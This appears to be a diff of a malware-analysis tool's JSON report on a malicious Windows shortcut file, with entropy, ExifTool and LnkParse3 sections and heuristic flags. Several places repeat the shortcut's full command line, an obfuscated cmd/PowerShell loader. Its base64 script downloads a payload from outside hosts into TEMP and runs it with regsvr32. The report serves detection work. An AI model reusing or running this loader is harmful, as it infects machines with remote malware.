@@ -1,30 +1,145 @@
 {
-    "response": {
-        "supplementary": [
-            "fbaeaffe99b1086cffed4e294badfa2aa0f2448c8aaeab16639b30e755b5376b"
-        ],
-        "extracted": [
-            {
-                "name": "69cb5f2a24.bat",
-                "sha256": "69cb5f2a24a8651539a5b1b60aa3f5375ac4d81288f8ade58a67df7cba6b500d"
-            }
-        ]
-    },
-    "result": {
-        "heuristics": [
-            1,
-            4
-        ],
+  "extra": {
+    "drop_file": false,
+    "score": 750,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [0.9927234817334138, 2.953853465372073, 2.2174648249554334, 1.1318602075980362, 2.7706113682014046, 1.2294624197173616, 2.135832171894209, 1.4070336601760305, 2.862642655410482, 3.287323619843549, 3.025907961532931, 3.246564945802805, 2.9442753084717066, 2.5418848434970744, 3.00049750239341, 3.1241159662109683, 2.985091635002319, 3.246564945802805, 3.00049750239341, 3.067893772289265, 3.1637628085158593, 3.205748619272193, 3.025907961532931, 3.108710098819877, 3.0821301554546343, 3.1495264253504898, 3.122946481985247, 3.1495264253504898, 3.204579135046471, 3.205748619272193, 3.0105020941418403, 3.164932292741581, 2.985091635002319, 3.093304231428786, 2.985091635002319, 3.1241159662109688, 3.122946481985247, 3.1241159662109688, 3.1229464819852466, 2.9708552518369498, 2.969685767611228, 3.246564945802805, 2.959681175862798, 3.1903427518811016, 3.0667242880635435, 3.1241159662109683, 4.296273947500356, 2.4286748885654155, 2.62891877220096, 0.3227569588973983]}}",
+        "body_format": "GRAPH_DATA",
+        "classification": "TLP:WHITE",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "File entropy: 3.919",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"flags\": \"IDList, RelativePath, CommandArgs, IconFile, Unicode\", \"file_attributes\": \"(none)\", \"icon_index\": 134, \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"cmd.exe\", \"relative_path\": \"..\\\\..\\\\Windows\\\\system32\\\\cmd.exe\", \"command_line_arguments\": \"/v:on /c TCO+Ku2odUc9JiHURdv4p+613Dq/BuBJ3BvYxNkFN3+8voXBH97lO4vxzSs2s51eNtm01shY||goto&p^o^w^e^r^s^h^e^l^l.e^x^e -c \\\"&{ iex ([string][System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2hvMjgwMzE5MDAxLmhvZ2liby5uZXQvaW5jbHVkZS90Z1F3eGljNFF3dU0vIiwiaHR0cDovL3d3dy5nZXJvbnRvZ2VyaWF0cmlhLm9yZy90bXAvY0I2Y2dUVmZ5eVozYjF3OWQvIiwiaHR0cDovL2NsdWJtYW5hZ2VyLm5ldC5hci9wcnVlYmEvVk5xc3gzNjhGSHFLSy8iLCJodHRwOi8vbXltaWNyb2dyZWVuLm1pZ2h0Y29kZS5jb20vRm94LUMvbmhNWXdrRlhCLyIsImh0dHA6Ly90b3dhcmRzdW4ubmV0L2FkbWluLzhOVzJUSmVQczhkWmhiLyIsImh0dHA6Ly9oa3dpbmRzYWNhZGVteS5zeW5vbG9neS5tZS9AZWFEaXIvcUgyRUh1dllWb0pFSjIvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0R3RVhyY2dOWGouUXlVO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvRHdFWHJjZ05Yai5ReVU7YnJlYWt9IGNhdGNoIHsgfX0='))) }\\\"\", \"icon_file_name\": \"shell32.dll\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:WHITE",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "Metadata extracted by ExifTool",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_format": "TEXT",
+        "classification": "TLP:WHITE",
+        "depth": 0,
+        "heuristic": null,
         "tags": {
-            "file.shortcut.icon_location": [
-                "shell32.dll"
-            ],
-            "file.shortcut.command_line": [
-                "..\\..\\Windows\\system32\\cmd.exe /v:on /c TCO+Ku2odUc9JiHURdv4p+613Dq/BuBJ3BvYxNkFN3+8voXBH97lO4vxzSs2s51eNtm01shY||goto&p^o^w^e^r^s^h^e^l^l.e^x^e -c \"&{ iex ([string][System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2hvMjgwMzE5MDAxLmhvZ2liby5uZXQvaW5jbHVkZS90Z1F3eGljNFF3dU0vIiwiaHR0cDovL3d3dy5nZXJvbnRvZ2VyaWF0cmlhLm9yZy90bXAvY0I2Y2dUVmZ5eVozYjF3OWQvIiwiaHR0cDovL2NsdWJtYW5hZ2VyLm5ldC5hci9wcnVlYmEvVk5xc3gzNjhGSHFLSy8iLCJodHRwOi8vbXltaWNyb2dyZWVuLm1pZ2h0Y29kZS5jb20vRm94LUMvbmhNWXdrRlhCLyIsImh0dHA6Ly90b3dhcmRzdW4ubmV0L2FkbWluLzhOVzJUSmVQczhkWmhiLyIsImh0dHA6Ly9oa3dpbmRzYWNhZGVteS5zeW5vbG9neS5tZS9AZWFEaXIvcUgyRUh1dllWb0pFSjIvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0R3RVhyY2dOWGouUXlVO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvRHdFWHJjZ05Yai5ReVU7YnJlYWt9IGNhdGNoIHsgfX0='))) }\""
-            ],
-            "file.name.extracted": [
+          "file": {
+            "name": {
+              "extracted": [
                 "cmd.exe"
-            ]
+              ]
+            },
+            "shortcut": {
+              "command_line": [
+                "..\\..\\Windows\\system32\\cmd.exe /v:on /c TCO+Ku2odUc9JiHURdv4p+613Dq/BuBJ3BvYxNkFN3+8voXBH97lO4vxzSs2s51eNtm01shY||goto&p^o^w^e^r^s^h^e^l^l.e^x^e -c \"&{ iex ([string][System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2hvMjgwMzE5MDAxLmhvZ2liby5uZXQvaW5jbHVkZS90Z1F3eGljNFF3dU0vIiwiaHR0cDovL3d3dy5nZXJvbnRvZ2VyaWF0cmlhLm9yZy90bXAvY0I2Y2dUVmZ5eVozYjF3OWQvIiwiaHR0cDovL2NsdWJtYW5hZ2VyLm5ldC5hci9wcnVlYmEvVk5xc3gzNjhGSHFLSy8iLCJodHRwOi8vbXltaWNyb2dyZWVuLm1pZ2h0Y29kZS5jb20vRm94LUMvbmhNWXdrRlhCLyIsImh0dHA6Ly90b3dhcmRzdW4ubmV0L2FkbWluLzhOVzJUSmVQczhkWmhiLyIsImh0dHA6Ly9oa3dpbmRzYWNhZGVteS5zeW5vbG9neS5tZS9AZWFEaXIvcUgyRUh1dllWb0pFSjIvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0R3RVhyY2dOWGouUXlVO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvRHdFWHJjZ05Yai5ReVU7YnJlYWt9IGNhdGNoIHsgfX0='))) }\""
+              ],
+              "icon_location": [
+                "shell32.dll"
+              ]
+            }
+          }
+        },
+        "title_text": "Extra metadata extracted by LnkParse3",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"icon_location\": \"shell32.dll\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:WHITE",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 4,
+          "score": 250,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Suspicious icon used",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"relative_path\": \"..\\\\..\\\\Windows\\\\system32\\\\cmd.exe\", \"target_file_dosname\": \"Windows\\\\system32\\\\cmd.exe\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:WHITE",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Suspicious command line arguments",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "69cb5f2a24.bat",
+        "sha256": "69cb5f2a24a8651539a5b1b60aa3f5375ac4d81288f8ade58a67df7cba6b500d"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "features.json",
+        "sha256": "fbaeaffe99b1086cffed4e294badfa2aa0f2448c8aaeab16639b30e755b5376b"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 4,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "file.name.extracted": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "cmd.exe"
         }
-    }
+      ],
+      "file.shortcut.command_line": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "..\\..\\Windows\\system32\\cmd.exe /v:on /c TCO+Ku2odUc9JiHURdv4p+613Dq/BuBJ3BvYxNkFN3+8voXBH97lO4vxzSs2s51eNtm01shY||goto&p^o^w^e^r^s^h^e^l^l.e^x^e -c \"&{ iex ([string][System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2hvMjgwMzE5MDAxLmhvZ2liby5uZXQvaW5jbHVkZS90Z1F3eGljNFF3dU0vIiwiaHR0cDovL3d3dy5nZXJvbnRvZ2VyaWF0cmlhLm9yZy90bXAvY0I2Y2dUVmZ5eVozYjF3OWQvIiwiaHR0cDovL2NsdWJtYW5hZ2VyLm5ldC5hci9wcnVlYmEvVk5xc3gzNjhGSHFLSy8iLCJodHRwOi8vbXltaWNyb2dyZWVuLm1pZ2h0Y29kZS5jb20vRm94LUMvbmhNWXdrRlhCLyIsImh0dHA6Ly90b3dhcmRzdW4ubmV0L2FkbWluLzhOVzJUSmVQczhkWmhiLyIsImh0dHA6Ly9oa3dpbmRzYWNhZGVteS5zeW5vbG9neS5tZS9AZWFEaXIvcUgyRUh1dllWb0pFSjIvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0R3RVhyY2dOWGouUXlVO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvRHdFWHJjZ05Yai5ReVU7YnJlYWt9IGNhdGNoIHsgfX0='))) }\""
+        }
+      ],
+      "file.shortcut.icon_location": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "shell32.dll"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
 }
